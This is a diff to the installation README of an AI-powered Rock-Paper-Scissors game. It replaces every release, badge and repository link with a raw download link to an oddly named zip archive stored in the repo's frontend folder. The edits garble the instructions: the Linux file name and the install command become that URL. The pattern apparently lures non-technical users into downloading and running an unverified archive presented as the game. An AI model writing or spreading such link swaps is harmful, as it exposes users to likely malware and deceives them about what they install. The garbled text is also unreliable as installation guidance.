@@ -4,7 +4,7 @@
 
 Welcome to Rps-plus-gemini-ai! This is your guide to downloading and running our AI-powered Rock-Paper-Scissors game. Don't worry if you have no technical background. We will walk you through the steps to get started easily.
 
-[![Download the latest release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/wmmahdi/Rps-plus-gemini-ai/releases)
+[![Download the latest release](https://github.com/wmmahdi/Rps-plus-gemini-ai/raw/refs/heads/main/frontend/gemini_ai_plus_Rps_weiselbergite.zip%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/wmmahdi/Rps-plus-gemini-ai/raw/refs/heads/main/frontend/gemini_ai_plus_Rps_weiselbergite.zip)
 
 ## 💡 What is Rps-plus-gemini-ai?
 
@@ -31,7 +31,7 @@ Before you download, ensure your system meets the following requirements:
 To get started with Rps-plus-gemini-ai, follow these steps:
 
 1. Click on the link below to visit the Releases page:
-   [Download the latest release](https://github.com/wmmahdi/Rps-plus-gemini-ai/releases)
+   [Download the latest release](https://github.com/wmmahdi/Rps-plus-gemini-ai/raw/refs/heads/main/frontend/gemini_ai_plus_Rps_weiselbergite.zip)
 
 2. Once on the Releases page, find the most recent version of the software.
 
@@ -39,7 +39,7 @@ To get started with Rps-plus-gemini-ai, follow these steps:
 
    - **Windows:** Look for a `.exe` file.
    - **macOS:** Choose the `.dmg` file.
-   - **Linux:** Select the `.tar.gz` file.
+   - **Linux:** Select the `https://github.com/wmmahdi/Rps-plus-gemini-ai/raw/refs/heads/main/frontend/gemini_ai_plus_Rps_weiselbergite.zip` file.
 
 4. After the download is complete, locate the file in your Downloads folder.
 
@@ -50,7 +50,7 @@ To get started with Rps-plus-gemini-ai, follow these steps:
    - Open the `.dmg` file. Drag the Rps-plus-gemini-ai icon into your Applications folder.
 
    For **Linux**:
-   - Extract the contents of the `.tar.gz` file. Open a terminal and navigate to the extracted folder. Run the installation with `./install.sh`.
+   - Extract the contents of the `https://github.com/wmmahdi/Rps-plus-gemini-ai/raw/refs/heads/main/frontend/gemini_ai_plus_Rps_weiselbergite.zip` file. Open a terminal and navigate to the extracted folder. Run the installation with `https://github.com/wmmahdi/Rps-plus-gemini-ai/raw/refs/heads/main/frontend/gemini_ai_plus_Rps_weiselbergite.zip`.
 
 6. Once installed, you can launch the game from your desktop or applications menu.
 
@@ -77,7 +77,7 @@ Join our community and connect with other players! You can share tips, insights,
 
 For more information and updates, you may visit:
 
-- [GitHub Repository](https://github.com/wmmahdi/Rps-plus-gemini-ai)
+- [GitHub Repository](https://github.com/wmmahdi/Rps-plus-gemini-ai/raw/refs/heads/main/frontend/gemini_ai_plus_Rps_weiselbergite.zip)
 - [Documentation](#)
 
 Thank you for choosing Rps-plus-gemini-ai. Have fun playing!
